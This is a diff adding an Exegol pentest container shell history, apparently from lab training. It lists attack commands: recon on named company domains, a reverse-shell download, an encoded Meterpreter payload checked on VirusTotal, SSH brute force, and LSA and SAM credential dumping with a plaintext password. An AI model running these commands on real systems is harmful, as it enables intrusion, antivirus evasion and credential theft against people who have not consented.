@@ -1,0 +1,30 @@
+# Config file dedicated to the user's personal history shared between all exegol containers
+searchsploit sudo buffer overflow -j | jq '.RESULTS_EXPLOIT[] | {Title: .Title, Code: .Codes, Dates_Published: .Date_Published}'
+searchsploit vlc player -j | jq '.RESULTS_EXPLOIT' | jq 'sort_by(.Date_Published)'
+toggle-vi-emacs-mode
+dnsrecon -d rg-creation.fr
+theHarvester.py -d ema-gestion.fr
+wafw00f https://ema-gestion.fr
+theHarvester.py -d https://rg-creation.fr
+feroxbuster -h
+theHarvester.py -d hackersploit.org -b google,linkedin
+whois facebook.com
+dig +nocmd +noall +multiline +answer ema-gestion.fr
+dig +nocmd +noall +multiline +answer ema-gestion.fr ns
+dig +noall +multiline +answer ema-gestion.fr mx
+dig +multiline ema-gestion.fr mx
+fierce -h
+nmap -sV -sC -O -p- -T4 $ip -oN resultNmap.txt -vv
+gobuster dir -w `fzf-wordlists` -u http://$TARGET:3333/ --proxy http://127.0.0.1:8080
+curl  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -o shell.php
+curl -s "https://crt.sh/?q=vandemoortele.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u
+msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
+/opt/tools/metasploit-framework/tools/exploit/virustotal.rb test.js
+mount -t nfs 10.129.14.73:/JNFS/ /mnt/nfs -o nolock
+creds search tomcat
+hydra -l sam -P password.txt ssh://10.129.14.45 -t 4  -I -v -V
+nxc smb  10.129.206.172  --local-auth -u bob -p 'HTB_@cademy_stdnt!' --lsa
+nxc smb  10.129.206.172  --local-auth -u bob -p 'HTB_@cademy_stdnt!' --sam
+hashcat --force /opt/rockyou.txt -r /usr/share/hashcat/rules/specific.rule  --stdout > pass.list
+hashcat --identify '$1$mERr$yhf7f2RnC74CxKANvoekD'
+
